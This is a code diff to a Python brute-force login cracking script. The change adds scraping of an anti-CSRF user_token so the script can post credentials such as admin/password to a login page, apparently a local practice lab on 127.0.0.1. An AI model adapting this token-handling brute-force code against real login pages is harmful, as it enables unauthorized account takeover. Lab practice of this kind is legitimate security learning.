@@ -32,6 +32,19 @@ class BasicBFC:
         print("start cracking ... ")
 
 
+def get_user_token(text):
+    """
+    get user token from html content.
+    like: 	<input type='hidden' name='user_token' value='12611d21980d8a0686a52c929a75b37e' />
+    :param text:
+    :return:
+    """
+    soup = BeautifulSoup(text, "html.parser")
+    user_token = soup.find('input', {'name': 'user_token'})['value']
+
+    return user_token
+
+
 def main():
     """
     basic brute force cracking algorithm
@@ -41,6 +54,7 @@ def main():
     url = "http://127.0.0.1:28080/login.php"
     method = "POST"
     username_list = ["admin"]
+    s = requests.session()
     # basic_bfc = BasicBFC(password_file=password_file, url=url, method=method, username_list=username_list)
 
 
@@ -50,8 +64,21 @@ def main():
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
     }
 
-    response = requests.post(url, headers=headers, data={}, timeout=1)
+    response = s.get(url, headers=headers, data={}, timeout=1)
+    user_token = get_user_token(response.text)
     print(response.text)
+    print("user_token ----> " + user_token)
+    data_with_token = {
+        "username": "admin",
+        "password": "password",
+        "user_token": user_token,
+        "Login": "Login"
+    }
+    print(data_with_token)
+    request = s.post(url, headers=headers, data=data_with_token, timeout=1)
+    print(request.status_code)
+    print(request.text)
+
 
 
 
